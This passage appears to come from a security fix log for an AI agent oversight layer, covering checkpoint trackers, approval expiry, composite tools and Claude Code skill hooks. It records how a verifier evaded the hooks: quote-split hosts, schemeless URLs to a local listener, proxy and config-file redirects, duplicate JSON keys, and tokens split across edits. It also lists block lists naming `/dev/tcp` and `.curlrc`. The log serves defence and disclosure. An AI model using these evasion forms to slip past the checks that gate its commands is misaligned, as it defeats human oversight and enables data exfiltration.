shared file whole from its own copy, so a stale tracker dropped another's
newer records, or brought a used one back unused (the verifier's lost
update: a new adapter then ran a call on a checkpoint already used).

- Root cause: records read back from the state file were treated as
  records of the tracker's scope. Fix (`checkpoint_tracker.py`): what a
  tracker reads back goes to its history, is found and restored
  (`find_checkpoint`, `restore_checkpoint`, the runner's rollback), and is
  never held, used or ended by it: it authorises none of its calls
  (`_valid` excludes the ids it read back) and counts as no checkpoint
  taken in its scope
  (`has_taken_since`, `has_commit`; the loaded `last_taken_at` is no longer
  this scope's). A hold the file names is its holder's (another live
  tracker's, or a dead process's): it is no longer marked used on load,
  since nothing read back authorises a call here anyway.
- Lost updates: each write merges, under an exclusive `flock` on
  `tracker_state.lock` beside the file (where the platform has `fcntl`):
  the tracker's own records and holds as it holds them; a record it read
  back as the file has it now (its owner may have used it since); every
  record and hold another tracker wrote since the load, unchanged; and a
  record it removed (pruned, cleared) stays removed. Measured without the
  lock: 4 trackers taking 10 checkpoints each in threads lost 1 to 4 of the
  40; with it, none.
- Statement (`scope`, `concurrency_note`), adapter and tracker docstrings,
  the SDK guide (a Scope bullet), SECURITY.md §5.5 and CHANGELOG Upgrading
  say so.
- Tests: `TestAdapterScope::test_another_adapters_checkpoint_authorises_nothing`
  (the verifier's run 1: B's unbound call and Write are F501 through the
  callback and the hook; A's Write runs on its own checkpoint) and
  `test_a_checkpoint_left_by_an_earlier_process_authorises_nothing` (run 2:
  the unbound call is F501, then one checkpoint covers one Write);
  `TestSharedDirectory` in `tests/test_checkpoint_persistence.py` (the lost
  update with B loaded before and after c1 was taken: the file keeps c1
  used and a new tracker authorises nothing; B's boundary leaves A's
  checkpoint and hold alone; a cleared record stays removed; four
  concurrent writers lose none). Seven tests that asserted the old rule
  (a reloaded checkpoint authorises a call, a loaded hold is marked used,
  `has_commit` counts a commit of an earlier adapter) now assert the new
  one: `TestCrossInstanceRestore` (three), `test_the_same_state_untracked_still_loads`
  (loaded, and authorising nothing; the tracked copy is still not loaded),
  `test_holds_persist_and_are_used_on_reload`,
  `test_unresolved_hold_is_used_on_reload` (the hold stays in the file),
  `test_checkpoint_survives_restart`, and
  `test_a_commit_recorded_before_the_scope_began_is_gated`;
  `test_history_capped_on_persist` reads the cap from the file.

#### 17. A composite could invoke an unbound tool; under a destination policy it ran (medium)

`load_bindings` resolved an `invokes` name against `known`, the mapper's
dynamic mappings, which hold `UNCLASSIFIED_TOOL` for a tool registered with
no capability and for one whose record failed to load. A composite that
listed such a tool loaded with no diagnostic, and `invoked_senders` counted
only bindings that perform `send`, so under `allowed_destinations` the
composite was put to a person (or, with `approval="off"`, allowed) while a
direct call of the tool was F504. The verifier's siblings: a send binding
whose record failed (S303) reached through its wrapper; a two-level chain
to an unbound tool.

- Fix (`bindings.py`): a `known` entry that is `UNCLASSIFIED_TOOL` resolves
  no name (V107, "which is unbound"), so the composite does not load and is
  unbound itself (F504 under a policy, as §5.18.2 requires). Fail closed
  besides (`mapper.invoked_senders`): an invoked name that is unbound or
  missing counts as a tool that may send. The refusal now says the invoked
  tools "may send".
- Sibling found while fixing it: V105 looked only at the set being loaded,
  so a record that invokes a composite loaded earlier, which invokes it,
  closed a cycle across two loads. The cycle check now runs through the
  bound tools loaded before (only the set's records are refused), in the
  Python loader and in the TypeScript package's `checkBindings(records,
  {known})` alike. Without it, item 18's reload would not terminate.
- Tests: `test_an_unbound_tool_resolves_no_invokes_name` (registered
  unbound, a failed send record, a two-level chain: V107, unbound),
  `test_a_tool_left_unbound_unloads_the_composites_that_invoke_it`,
  `test_an_unbound_or_missing_invoked_name_may_send`,
  `test_a_cycle_across_two_loads_is_v105` (`tests/test_tool_bindings.py`);
  `test_a_composite_that_reaches_an_unbound_tool_is_refused_under_a_policy`
  (ask and off; the verifier's p6b and p6: the direct call and both
  composites are F504, the checkpoint unused) in
  `tests/test_adapter_effects.py`; in `packages/acs-core/test/bindings.test.ts`,
  "closes no invokes cycle across two loads (V105)" (failed before) and a
  control.

#### 18. A composite kept the flags it loaded with (medium)

`load_bindings` joined the invoked bindings' flags into the composite once,
at load; `_apply_profiles` read them again only when profiles were applied.
Registering a composite's helper again as `mutate` left the composite low
risk with no checkpoint and no approval: its PreToolUse answer was allow in
every mode, while a fresh adapter loading the same records (the same
configuration digest) gave it high risk, a checkpoint and approval. The
same with the helper registered unbound or failing to load.

- Fix (`mapper.py`): registering or loading tools loads again, as one set,
  every loaded composite that invokes one of them, transitively, from its
  stored record (`_load_composites_again`, also after `register_mcp_tool`
  leaves a tool unbound). A composite takes the flags its tools have now,
  stricter or weaker, as a fresh load of the records the mapper holds
  would; one whose tool is now unbound fails V107 and is unbound. Its
  diagnostics go to `mapper.diagnostics` and `load_bindings`' result;
  `register_binding` raises only for its own record.
- Tests: `test_a_composite_takes_the_flags_its_bindings_have_now` (a
  two-level chain under three re-registrations agrees, flag by flag, with
  a fresh mapper loading `mapper.records`), and, through the hook,
  `test_a_composite_takes_a_stricter_registration_of_what_it_invokes`
  (ask and off: F501 without a checkpoint, then ask F502 or allow).

#### 19. A binding's approval.expires was never applied (medium)

`ApprovalPolicy.expires_seconds` was parsed and read nowhere: an `execute`
binding with `expires: PT30S` ran on a decision ten minutes after the ask,
and a `mutate` one was bounded only by the checkpoint's 30 minutes.

- Fix (`adapter.py`): the PreToolUse hook notes, for a call whose binding
  sets `approval.expires`, when it asked (`_asked_at`, by call id, dropped
  when the callback decides, the call reports back, or at a boundary); the
  permission callback refuses with F502 an allow from the host's callback
  that arrives later than that after the request (the hook's ask, or the
  callback's start when it came first or there was no ask). The refusal
  releases the hold: the call never ran. The statement's `expires` stays
  null (the layer sets no period of its own).
- Tests: `TestDecisionExpiry` in `tests/test_tool_call_approval.py`: a
  decision ten minutes after a 30-second expiry is F502 for `execute` and
  `mutate` (the checkpoint stays valid); one within it runs (control); the
  request is the hook's ask, not the callback's start.

#### 20. With a permission prompt tool, a hold was never checked again when the call was allowed (medium)

`wrap_options` installs no `can_use_tool` beside a
`permission_prompt_tool_name` (the SDK refuses both), so nothing ran the
atomic re-check and use at the allow (`consume_if_valid`); PostToolUse used
the hold whatever its validity. A Write whose prompt was answered after the
maximum age, or after another session's Stop, ran on that checkpoint, with
no F501. The same route could not apply item 19's expiry either: the
adapter never sees when that tool's decision arrives.

- Root cause: the layer relied on a prompt route on which it cannot
  complete §5.18.6's check at the allow. Fix: the PreToolUse hook knows
  the route (`wrap_options` passes `prompt_tool`) and, on it, refuses a call
  that requires a checkpoint with R407 (the layer cannot complete the
  re-check), before holding anything, and one whose binding sets
  `approval.expires` with F502. The prompt tool still decides calls that
  need approval and no checkpoint. The statement lists the route as its
  own prompt configuration with those limits, and drops the host gap of a
  lost hold (no call holds a checkpoint on that route now).
- Tests: `test_prompt_tool_refuses_a_call_that_needs_a_checkpoint` (R407
  for two Writes, nothing held, the checkpoint still valid; past the
  maximum age nothing runs on it) and
  `test_prompt_tool_decides_a_call_that_needs_approval_alone` (an `execute`
  tool is asked; one with `approval.expires` is F502). Two tests of the old
  route (a prompted Write holds the checkpoint; a failed prompted Write uses
  it) are replaced by these; `test_overlapping_prompt_tool_calls_on_one_checkpoint`
  now runs on the callback route, which holds, as
  `test_overlapping_prompted_calls_on_one_checkpoint`.

#### Siblings checked

- Plugin hooks: the pre-tool-use hook uses the marker before it asks, and
  Claude Code runs no hook when a person answers, so a call allowed after
  the marker's maximum age, or after another session's boundary, runs (the
  sibling of item 20). The hooks do not claim class SL and cannot check
  again at the allow; this is now named among their host gaps (SECURITY.md
  §5.5, hooks/README). Item 16's sibling there was closed in round 1 (item
  4: a marker ends at SessionStart; the project directory is the stated
  scope). They have no composites and no binding expiry.
- Standard Agents binding: its scope is a thread and its records live in
  the thread's store, not a shared file (16); a composite takes the tool
  objects it invokes when it is defined and the binding sees each nested
  call, checking a nested send's destination as a call of its own (17,
  18); its approvals are recorded decisions whose `expires` the
  `decision_expires` call fixture covers, and it has no prompt route (19,
  20). The TypeScript package's loader shared item 17's cycle sibling,
  fixed above. No call fixture changed: the new rules concern a layer's
  persisted records, sequential loads and a host prompt route, which the
  fixtures do not model.
- Earlier fixes hold: the full suites pass with them (below); the shipped
  state file is still not loaded at all (`test_a_cloned_state_file_authorises_nothing`).

#### Documentation

The adapter's statement (`scope`, the prompt configurations, the host gaps,
`concurrency_note`), SECURITY.md §5.5 (the adapter's scope, re-check and
expiry, composites; the plugin hooks' new host gap), hooks/README, the SDK
guide (Scope, Expiry, the prompt tool paragraph and figure, composites in
the registration rules and the destination policy), and CHANGELOG
Upgrading (the tracker's scope and lock, expiry, the prompt tool route,
`invokes` resolution and reloads, the TypeScript package's V105). The
Standard's text is unchanged: each fix brings an implementation to it. No
version changes.

The SDK guide is an enforced page of the figure-gap sweep. Measured with
`scripts/check-runs.mjs` and the local headless shell of Chromium revision
1248 (CI's is 1254; at HEAD this build measures the page's longest run at
1798 px): a Scope bullet among the checkpoint bullets made that run 1878 px
and the longer prompt-tool paragraph its run 1849 px. The scope now opens
the Checkpoint Lifecycle section, before its figure (a run of 696 px at
HEAD, 836 px now), and the paragraph is no longer than before; no run that
was over 1500 px grew, the page's longest is 1798 px as at HEAD.

#### Checks after batch 3

- Python: `pytest tests/` (4868 passed, 18 skipped; 20 more than after
  batch 2); ruff check and format with CI's lists; mypy; every
  `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py --strict` and
  every domain catalog and example `--strict`; the generators' `--check`
  (`sync_skill_schemas`, `gen_runtime_fixtures`, `gen_call_fixtures`,
  `gen_trigger_vectors`, `gen_standard_agents_binding`,
  `gen_capability_json_schemas`).
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1879; the
  WebAssembly build reused); the binding's check and test (191, 2
  skipped). No call or binding fixture changed.
- Site: `npm run check`, `npm test` (1173), `npm run build` (check-dist
  passed) and `scripts/check-runs.mjs --paths /guides/claude-agent-sdk/`
  (above).
- Probes: none left running; the scratch copies of the old sources were
  removed.

### Batch 4: five reported defects

Security round 1's fourth batch: five defects an independent verifier
reproduced on 99c37dd: one in the Python SDK adapter's grounded MCP tools,
one in its I-JSON walks, and three in the send and audit skills' command
hooks. None was fixed by an earlier batch (b61b3b1, ffe4ac4, 2fa8648 and
26b38ca did not touch them). Each fix has tests that fail on the code before
it (run with the old adapter, output and bindings modules, and the old send
and audit SKILL.md: 5 adapter tests, 2 memory tests and 236 hook test cases
under sh and bash failed; the rest are controls that pass on both).

Skill hooks stay registered for the rest of the session once the skill runs
(SECURITY.md §5.4), so a hook that refused every command it cannot read
would refuse ordinary commands (`git`, `npm`, `python`) for the rest of the
session. Both skill hooks therefore first decide, from the text with its
quotes and backslashes removed (so `c''url` and `rec''ords` count), whether
a command concerns them, and read every command that does fail-closed;
what they cannot see is stated, with the plugin's pre-tool-use hook (a
checkpoint and a person's approval) as the gate behind them.

#### 21. A grounded MCP tool's decision was granted at the ask (medium)

The PreToolUse hook's `ask` branch called `_allow_token` before anyone
decided, and only the permission callback's deny withdrew it. A caller
outside the wrapped session that shares the server object ran a `mutate`
call while the person had not decided (the verifier's case A), and the
approved in-session call was then refused with R407 (B); a refusal the
adapter never hears of (another PreToolUse hook's deny, an interrupt, a
permission prompt tool's deny) left the token until the next boundary (C);
and the adapter's own refusals in the callback (a host callback that
raises, a checkpoint no longer valid, a call with no id) never withdrew it
(D).

- Fix (`adapter.py`): the hook's ask notes the call (`_asked_calls`) and
  grants nothing. The permission callback settles every answer in one place
  (`_settle_decision`): it withdraws what the hook left for the call (its
  ask or its pass's grant), and on an allow, and only for a call the hook
  passed or asked about, grants the decision for the arguments the call
  runs with; any other answer, an error included, grants nothing. A call
  that reports back (PostToolUse, PostToolUseFailure) forgets what it left
  (`_forget_call`: the SDK refuses arguments its schema rejects before the
  handler), and an internal error in the hook withdraws it. A grant is not
  repeated for a call already granted.
- The SDK passes a served tool's handler no call id (`run_tool(name,
  arguments)`), so the decision is matched by tool name and arguments; the
  statement names the remaining window (between the allow and the call, or
  after a refusal the adapter never hears of of a call it allowed without
  asking) as a host gap. Claude Code sends `_meta["claudecode/toolUseId"]`
  in `tools/call`, but the SDK's server drops it before the handler.
- With a permission prompt tool the adapter never sees an allow, so a call
  that requires approval of a served tool is refused with R407 at
  PreToolUse (as item 20 refuses one that needs a checkpoint), instead of
  being granted at the ask; the statement's prompt configuration says so.
- Tests (`tests/test_mcp_integration.py`, `TestGroundedServerGuard`):
  `test_an_asked_call_runs_only_once_it_is_allowed` (A and B),
  `test_a_refused_call_leaves_no_decision` (deny, and a host callback that
  raises: D), `test_a_call_never_decided_leaves_no_decision` (C),
  `test_a_call_that_reported_back_leaves_no_decision`,
  `test_a_prompt_tool_route_refuses_a_served_call_that_needs_approval`. The
  verifier's probe now prints R407 for every outside call and runs the
  approved one.

#### 22. The I-JSON walks built every child's path string up front (low)

`check_i_json` (the output check, `grounded_agency/capabilities/output.py`)
and `i_json_problem` (a call's and a binding's arguments,
`capabilities/bindings.py`) built each child's whole path when its parent
was popped: a long member name above a wide array cost the name's length
times the width (80 KB took 819 MB; the verifier's extrapolation, about
125 GB for 1 MB). It failed closed under a memory limit (MemoryError became
R407), but without one a hostile MCP server could exhaust the host.

- Fix: each value on the stack carries its place as a link to its parent's
  (`Place`, `place_text`), and the text is written only for the value
  refused. Measured after: 1 MB of `{"x"*200000: [0]*400000}` takes 110 MB
  peak and 0.4 s in the output check, 104 MB in `i_json_problem`.
- Siblings: the TypeScript package's `iJsonProblem` builds its paths with
  template strings, which V8 keeps as rope strings: measured on 1 MB of the
  same shape, 94 MB of heap, linear, so it is unchanged.
  `grounded_agency/state/memory.py`'s `_ijson_problem` is recursive and
  builds one path at a time: memory stays small (copying is about 0.16 s
  for 100 KB names over 50,000 items).
- Tests (`tests/test_capability_output.py`):
  `test_the_check_takes_memory_in_proportion_to_the_output` (array and
  object layouts, traced peak under 20 times the input plus 2 MB; before,
  the paths alone were 100 MB) and `test_a_refusal_still_names_the_place`
  (control).

#### 23. The send skill's internal-address rule read raw text (medium)

The rule matched the command's text, so quote removal (`local""host`),
brace expansion, curl's URL globbing and `--variable`/`--expand-url`, a URL
with no scheme (`curl 127.1:18777`, `wget -qO- 127.1:18777`), one slash
(`http:/127.0.0.1`), a percent-encoded host and names under `.localhost`
all reached a 127.0.0.1 listener; and a python one-liner with no curl, wget
or http in its text was never read.

- Fix (`skills/send/SKILL.md`): the hook reads a command that names curl,
  wget or http (or `.curlrc`, `.wgetrc`, `/etc/hosts`, `resolv.conf`,
  `/dev/tcp`, `/dev/udp`) in any quoting with a jq reader of the shell's
  words (`hooks/shell_words.jq`, shared with the audit hook, its copies kept
  equal by `test_shell_words_copies_are_equal`): quotes removed, unquoted
  glob characters marked, redirections and their targets known. Each request
  is read as the tool reads it: the words after `curl`, `wget` or `http`
  (wherever it stands, `timeout 5 curl` included), options with their
  arguments (per-tool tables from `curl --help all` and `wget --help`), and
  as a host every word the tool may take as a URL. A host is read the way
  curl and wget read one (a scheme with any number of slashes; one slash is
  read both as curl's `http:/host` and wget's `host:/path`; `user@`; a port
  of digits) and refused when it is internal (`localhost`, under
  `.localhost`, `localhost.localdomain`; IPv4 in any inet_aton form in 0/8,
  127/8, 10/8, 172.16/12, 192.168/16, 169.254/16 and, new, 100.64/10;
  internal IPv6 literals) or cannot be read (percent-encoding, non-ASCII,
  braces or brackets curl expands, a glob character before the path). A URL
  any program in the command is given is read the same way (`git clone
  http://local""host/`), a request inside a command line given as a word
  (`sh -c '...'`, an interpreter's code) is refused, and the old raw checks
  still run first. Unquoted braces, an unclosed quote and a here-document
  are refused. jq's global match costs the text times its matches (50,000
  words took 42 s), so the reader takes a command of at most 16384 bytes
  (worst case 1.8 s); a longer one that names the tools is refused.
- Not read (stated in SECURITY.md §5.4 and the hook): a request another
  program makes with no such name in its text (the python one-liner of the
  report, `nc`), a name that resolves to an internal address, and a
  redirect a server answers with; the plugin's pre-tool-use hook gates each
  as a `send`. The defect offered this statement as the alternative to
  widening the trigger, which, with session-wide hooks, would refuse every
  interpreter for the rest of the session.
- Tests (`TestSendCommandHook`): the reported forms added to
  `test_blocks_internal_destination`; `test_blocks_words_the_shell_expands`,
  `test_blocks_a_host_it_cannot_read`, `test_reads_a_url_any_program_is_given`,
  `test_blocks_a_request_inside_a_command_line`,
  `test_a_long_command_is_refused_in_bounded_time`,
  `test_a_command_at_the_bound_is_read_in_bounded_time`, and
  `test_leaves_other_commands_alone` (commands that name no tool, and named
  ones that send nowhere internal). The allowed IPv6 example now quotes its
  brackets: unquoted, a planted directory such as `http:/0` would turn
  `http://[0:db8::1]/` into `http://0/`; the unquoted form is refused.

#### 24. The send skill's redirect rule matched exact spellings (medium)

`-''x`, `--pr""oxy`, `--proxy1.0`, curl's abbreviations (`--resol`),
wget's `--exe=httpproxy=...`, `CURL_HOME=.` (with a planted `.curlrc`),
`XDG_CONFIG_HOME`, `HOME`, `WGETRC` and git's `-c http.proxy` and
`-c http.curloptResolve` all sent the request to the listener.

- Fix (same reader): a long option is refused when its name (before `=`)
  starts with a redirecting option (`--proxy` covers `--proxy1.0` and
  `--proxy-*`) or is a prefix of one of at least three characters (an
  abbreviation); curl's `--variable` and `--expand-*`, wget's
  `--use-askpass`, `--input-metalink` and `--config` join the list. A short
  cluster is read up to its first letter that takes an argument, so `-x` is
  found in `-sx` and not in `-HX-Api-Key:...`. A variable set on the line,
  or `CURL_HOME`, `HOME`, `XDG_CONFIG_HOME`, `WGETRC`, a CA bundle,
  `HOSTALIASES` or a `*_proxy` set anywhere in the command (`export`,
  `env`), is refused, as is a word naming `.curlrc`, `.wgetrc`,
  `/etc/hosts`, `resolv.conf`, `/dev/tcp` or `/dev/udp`, and git's
  `-c http.*`, `url.*`, `core.gitproxy`, `core.sshcommand`, `protocol.*`,
  `remote.*` and `--config-env`.
- Tests: the seven reported commands and the verifier's siblings added to
  `test_blocks_a_redirected_connection`; `test_blocks_a_command_with_a_variable_set`,
  `test_blocks_a_file_that_sets_where_a_request_goes`,
  `test_blocks_git_settings_that_redirect_it`.

#### 25. The audit skill's secret check was skipped for other spellings (medium)

The hook read the records file's name as written (`*records.jsonl*`), so
`rec''ords.jsonl`, `records.json?` and `rec*.jsonl` skipped every check; jq
keeps the last of two values of one member name, so `{"a":"<token>","a":"x"}`
was scanned as `{"a":"x"}`; `sed -i` wrote a record in two steps, neither of
which held a token; a python one-liner wrote one; and an Edit or a Write of
the file was never read (the hook was on Bash only). §5.18.10 requires the
audit row's secret check of code.

- Fix (`skills/audit/SKILL.md`): the append form's record is refused when
  it gives a member name twice (the values jq's stream reads against those
  of the object it keeps; I-JSON names are unique). Any other command that
  may name the file (it names `records`, `jsonl`, `audit` or `.claude` in
  any quoting, runs in a directory under `.claude` (the hook input's
  `cwd`: Claude Code keeps the directory a command left), or holds a glob
  that may match `.claude/audit/records.jsonl` from where it runs) is read
  with the shared word reader and may not redirect output to a file (but
  `/dev/null`, `/dev/stdout`, `/dev/stderr`), run a program other than a
  few that write no file but by a redirection and run no other code (`cat`,
  `echo`, `printf`, `jq`, `ls`, `head`, `tail`, `wc`, `grep`, `cut`, `tr`,
  `base64`, the digests, `date`, `hostname`, `sleep`, `test`, `true`,
  `false`, `pwd`, `cd`, `stat`, `basename`, `dirname`, `mkdir`, `openssl
  dgst` without `-out` and the like, and `mv` only to move the file aside),
  set a variable for one command or `PATH`, `IFS`, `ENV`, `BASH_ENV`,
  `CDPATH`, `LD_*`, `DYLD_*`, `OPENSSL_*`, substitute a command or a
  process or escape text, or hold an unclosed quote, a here-document or an
  unquoted brace; over 16384 bytes it is refused. A new hook on Edit,
  Write, MultiEdit and NotebookEdit refuses an edit of the records file,
  of another file under `.claude/audit/` (the records moved aside), or of
  a file named `records.jsonl` or `records.*.jsonl`, in any case, the path
  as written and the file it reaches (links followed; a link that cannot be
  followed is refused), and another name of the records file (`-ef`).
- Not read (stated in SECURITY.md): a name built only when a command runs
  (an interpreter's computed string, escape sequences) and a link planted
  under another name before the skill ran; the plugin's pre-tool-use hook
  gates such a write as a `mutate` a person approves. The old documented
  gap (`cp`, or `tee` from a pipe) is closed for a command that names the
  file.
- Tests (`TestAuditCommandHook`): `test_blocks_a_write_other_than_the_append_form`
  (the quoted and globbed names), `test_blocks_a_program_that_could_write_the_records_file`
  (both `sed -i` steps, the python one-liner, `cp`, `tee`, `dd`, `ln`,
  `git checkout`, `curl -o`, `openssl -out`), `test_mv_only_moves_the_records_file_aside`,
  `test_blocks_a_command_it_cannot_read`, `test_reads_a_glob_from_the_directory_it_runs_in`,
  `test_blocks_a_record_with_a_name_given_twice`, the Edit hook's three
  tests, and the allowed commands of the session (`python3 -m pytest`,
  `git commit -m "$(cat msg.txt)"`, `ls *.py`, `sed -i ... src/*.py`).
  `test_a_command_hook_that_fails_or_times_out_blocks_the_call` now checks
  every command hook of a skill (the audit skill has two).

#### Siblings checked

- Plugin hooks: the pre-tool-use hook's Bash classifier already dequotes
  (round 1 #16) and gates every call these skill hooks miss; no change.
- The persist skill's Edit hook already follows links; its matcher leaves
  out NotebookEdit, which writes notebooks, not memory files.
- Standard Agents binding: no grounded MCP server and no token (21); its
  I-JSON walk is the TypeScript one above (22); no skill hooks (23 to 25).
  No call or binding fixture changed.

#### Documentation

SECURITY.md (§5.4: the send row, the audit rows, a row for the new Edit
hook, the consequences; §5.5: the adapter's grant at the allow and the
prompt tool's refusal of a served tool), the adapter's statement (prompt
configuration, a host gap for the name-and-arguments match), the mcp
module and adapter docstrings, the SDK guide (the `require_layer`
paragraph, and the prompt tool paragraph kept shorter than before, an
enforced page of the figure-gap sweep), hooks/README (the shared reader),
the audit skill's step 6, and CHANGELOG (Upgrading: the adapter's grant,
the prompt tool's refusal, both skill hooks; Fixed: the I-JSON memory). The
Standard's text is unchanged. No version changes.

#### Checks after batch 4

- Python: `pytest tests/` (5179 passed, 18 skipped; the hook tests added
  during the run, 6 more, passed on their own); ruff check and format with
  CI's lists; mypy; every `tools/validate_*.py` of CLAUDE.md,
  `validate_workflows.py --strict` and every domain catalog and example
  `--strict`; the generators' `--check` (`sync_skill_schemas`,
  `gen_runtime_fixtures`, `gen_call_fixtures`, `gen_trigger_vectors`,
  `gen_standard_agents_binding`, `gen_capability_json_schemas`).
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1879; the
  WebAssembly build reused); the binding's check and test (191, 2
  skipped). No call or binding fixture changed.
- Site: `npm run check`, `npm test` (1173), `npm run build` (check-dist
  passed). The SDK guide's prompt tool paragraph is 453 characters, 20
  fewer than before (its run is near the figure-gap limit); the
  `require_layer` paragraph gained one sentence in a short run.
- Hook timing: the worst cases under the 16384-byte bound took 1.8 s (send)
  and 1.0 s (audit) under sh and bash; 1 MB commands are refused or left
  alone in under 0.5 s.
- Probes: none left running; no listener was started (the verifiers'
  listener runs are cited above).

### Batch 5: five reported defects

Security round 1's fifth batch: five defects an independent verifier
reproduced on 99c37dd: one in the persist skill's command hook, three in
the Standard Agents binding (with a Python SDK sibling for one), and one in
the redactors of both SDKs. None was fixed by an earlier batch (b61b3b1 to
d3f11f9 did not touch them; batch 4 noted the persist hook's matcher left
out NotebookEdit, which the verifier now counts a sibling, and it is
closed here). Each fix has tests that fail on the code before it (run with
the old hook body, binding sources, loaders and redactors: 30 hook test
cases under sh and bash, 9 binding tests, the new call fixture on both
layers, a Python and a TypeScript loader test, and the redaction tests and
vector named below; the rest are controls that pass on both).

#### 26. The persist hook scanned fragments, not what the file stores (medium)

`skills/persist/SKILL.md` joined the call's `new_string`/`content`/
`edits[].new_string` and scanned that text as written. A token split
across two MultiEdit edits (or two Edit calls), a value whose key is in the
unchanged text (`password: "CHANGEME"` edited to `s3cretpass99xyz`, the
password of `postgres://app:DBPASS@...`), and a JSON-escaped token in a
`memory.json` all passed, though the hook's own `secret_in` recognises the
file as it is after each call; the audit hook already resolved escapes
(round 2 #11). Sibling: NotebookEdit was neither matched nor scanned.

- Fix: the command hook reads the file the path reaches (when it exists: a
  regular file of at most 8 MB; any other existing target is refused F504,
  one it cannot read R407), applies the call (Edit, MultiEdit's edits in
  order, `replace_all` honoured, an empty `old_string` creating; an
  `old_string` found only with curly quotes read as straight ones, as
  Claude Code finds it), and scans, beside the text the call carries, the
  lines of the result it does not hold now (by count, so a line repeated
  counts); then both again with `\uXXXX`, `\UXXXXXXXX`, `\xXX`, `\/` and
  `\"` decoded (split and join in jq, linear; a code point below 32 or a
  surrogate is left as written). Lines the call leaves as they were are not
  read again: skill hooks stay registered for the rest of the session, and
  a whole-file scan would refuse every later edit of a file that holds a
  credential-shaped example (a test fixture). The matcher is
  `Edit|Write|MultiEdit|NotebookEdit`; a NotebookEdit's `notebook_path` is
  checked as a path and its `new_source` scanned.
- Timing: a 1 MB file of 30,000 lines with one Edit takes 0.4 s, an 8.7 MB
  file 2.4 s; 1 MB of nothing but `A` escapes about 6 s (inside the
  30 s timeout, which blocks: `onFailure: block`). jq's object update in a
  `reduce` with a nested state copied the state each step (17 s for 30,000
  lines), so the line counts are two flat maps compared once.
- Tests (`TestPersistCommandHook`, sh and bash):
  `test_blocks_a_credential_the_file_holds_after_the_call` (six: the
  MultiEdit split, the second of two Edit calls, a password and a URL
  password whose context is in the file, `replace_all` with a second edit,
  a curly-quoted `old_string`), `test_blocks_a_credential_a_reader_decodes`
  (six escapes), `test_blocks_a_credential_a_notebook_edit_carries`,
  `test_blocks_a_target_it_will_not_read`, and the matcher test with
  NotebookEdit: 30 failed on the old body; controls
  `test_allows_an_edit_that_adds_no_credential` (a file with a token example
  edited elsewhere, a key edited to prose, an `old_string` not found),
  `test_reads_a_large_file_in_bounded_time` and
  `test_reads_a_file_with_nul_bytes_quietly` (the scan text drops NUL
  bytes, of which bash's command substitution warns on stderr).
- Not read (stated in SECURITY.md §5.4, the persist row): a credential
  split across lines (a YAML escaped line break included; the scan, like
  `secret_in`, reads a line at a time), escapes no reader of JSON or YAML
  resolves (octal), a file written by another tool (the skill allows `Read`
  and `Edit`; the plugin's pre-tool-use hook gates any other write as
  `mutate`).

#### 27. Nested calls of tools the binding did not define went unchecked (medium)

`groundedTool` accepted in `invokes` a tool defined with plain `defineTool`,
annotation-only or unbound, and treated it as the strictest case; but
`nestingState.invokeTool` only issued tokens, which such a tool never takes.
Under `configureLayer({destinations})`, a grounded `relay` approved once
sent through `notify` (a record with `capability: send`, `destination:
/to`) and through an unbound `fetch` to an attacker URL, and the trace held
neither call. The adapter refuses such a composite (F504 under a policy;
V107 for an unbound invoked name).

- Fix (`grounded.ts`): a listed tool with no binding the layer loads (no
  `acs` annotation, or one that does not load on its own: a malformed
  record, a record with `invokes`) makes `groundedTool` throw V107
  (§5.18.4's table), as the Python loader and `checkBindings` do. A listed
  tool defined with plain `defineTool` and a loadable record is seen at
  the invocation, so the composite's nesting state checks it as a call of
  its own where the composite's approval and checkpoint do not reach: a
  `send`'s destination, at the record's `destination` pointer, against the
  layer's policies, the composite's profiles' and those enclosing it (no
  pointer, or a value that is not a string: F504); that the decisions that
  approved the composite are valid for the record's approval (F502: no
  decision of its own can be asked of a tool the binding does not wrap);
  its prerequisites (F501/F503/V102). It records the call before it runs
  (`started`, `covered_by`) and completes it (`executed`, or `failed` on an
  error result), a record that cannot be written refusing the call (R407).
- Tests (`test/nesting.test.ts`): the nested send under a policy (refused
  to the attacker, run to an allowed host, both recorded with
  `covered_by`), a record with no destination argument, a nested call
  recorded with no policy, and V107 for an unannotated tool, a record that
  does not load and a record with `invokes`: 4 failed before.
- Statement: `covers` names these nested calls; `does_not_cover` the
  other calls of plain tools.

#### 28. memoryTools could not take profiles (medium)

`memoryTools()` built its two grounded tools with no `profiles` or
`grounding`, and profiles applied only per tool; `configureLayer` took
only a profile policy's destinations. Under the shipped healthcare profile
(`checkpoint_policy` persist always, `require_human: low`), a host
`persist` tool was refused F502 while `persist_memory` stored patient data
with no checkpoint, approval or person; `memoryTools({profiles})` dropped
the option.

- Fix: `MemoryOptions` gains `profiles` and `grounding`, forwarded to both
  tools (and `recall` registers `secrets` too). The layer applies profiles
  layer-wide: `configureLayer({ profiles })` (a `BindingProfiles`) puts
  their destinations among the policies in force, and every `groundedTool`
  defined after it applies them beside its own (flags, person, grounding,
  minimum confidence); `config_sha256` covers them (`layer_profiles`). A
  tool's flags are computed when it is defined, so a tool whose layer
  profiles are not the ones in force at its call (configured, changed or
  reset after it was defined) refuses the call with R407 rather than run
  without them (§5.21.1). `configureLayer({ profilePolicy })` throws for a
  policy that sets a minimum confidence or grounding policies, which it
  would not put in force (§5.21.4).
- Tests (`test/memory.test.ts`): the profiles given to `memoryTools` (F502
  with a person required, the annotation's flags raised), the layer's (F502,
  then R407 after `resetLayer`, and R407 for tools defined before a profile
  was put in force), and the `profilePolicy` refusal: 3 failed before.
- Python sibling: none; `GroundedAgentConfig.profiles` already applies to
  every call the adapter sees.

#### 29. Redaction and refusal patterns read runs again from each position (low)

The URL-password patterns (`\b[A-Za-z][A-Za-z0-9+.-]*://` in redaction,
the same with no `\b` in the refusal rule), the JWT patterns (an `eyJ` at
each word boundary, or anywhere for the refusal shape) and the PEM pattern
(a lazy body to the end of the text from each header with no end) were
read from every position of a long run: 1 MB took minutes to hours in both
SDKs (Python `holds_credential` of `'f0'*n`: 8.2 s at 100 KB; TypeScript
`holdsCredential` of `'eyJ'*n`: 40.9 s at 200 KB), on model-chosen data in
the binding's check, `persistEntry`, every trace entry and anchor, and the
adapter's PreToolUse. The verifier found the hook timeout fails closed; the
cost remained.

- Fix (`redaction.py`, `redact.ts`, identically): a URL's scheme is read
  from the start of its run (`(?<![A-Za-z0-9+.-])[0-9+.-]*[A-Za-z]
